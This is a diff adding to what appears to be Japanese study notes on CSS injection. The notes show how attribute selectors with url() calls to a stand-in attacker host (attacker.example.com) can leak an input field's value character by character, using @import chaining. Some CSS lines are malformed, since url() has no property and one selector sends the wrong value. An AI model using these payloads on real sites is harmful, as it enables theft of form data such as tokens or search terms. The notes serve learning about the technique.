@@ -46,3 +46,29 @@ input[value^=b] {
 }
 ......
 ```
+
+しかし、すべての通りを記述するのは現実的でないため
+*@import url(...)* を利用する
+
+Step 1: 起点となる CSS ファイルを読み込むコードを挿入する
+```html
+<link rel="stylesheet" href="http://localhost:4444/evil_1.css">
+```
+
+evil_1.css
+```css
+input[value^=a] {
+	url(http://attacker.example.com/?value=a);
+}
+```
+
+evil_2.css
+```css
+input[value^=la] {
+	url(http://attacker.example.com/?value=a);
+}
+```
+
+> hidden 属性では使えなかった。抜け道あり？
+
+> 検索ボックス内の value から検索内容を盗む？
